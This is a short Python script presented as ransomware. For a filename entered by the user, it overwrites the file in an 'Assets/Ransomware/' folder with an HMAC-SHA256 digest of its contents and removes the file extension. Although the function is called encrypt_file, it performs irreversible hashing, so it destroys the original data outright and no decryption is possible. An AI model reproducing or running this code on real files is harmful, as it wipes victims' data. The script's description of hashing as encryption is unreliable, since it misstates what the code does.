#!/usr/bin/env python3

import random
import hashlib
import hmac
import os

PATH = "Assets/Ransomware/"


def encrypt_file():
    file_name = input("Enter Filename : ")

    message = random.randbytes(128)
    message = message.hex()
    message = message.encode()
    
    try:
        with open(f"{PATH}{file_name}", 'r') as r:
            text = r.read()
            text = text.encode()

        crypt = hmac.new(text, message, hashlib.sha256)

        with open(f"{PATH}{file_name}", 'w') as w:
            w.write(str(crypt.hexdigest()))

        os.rename(f"{PATH}{file_name}", os.path.splitext(f"{PATH}{file_name}")[0])

    except FileNotFoundError as e: 
        print(e)


def ransomware():
    encrypt_file()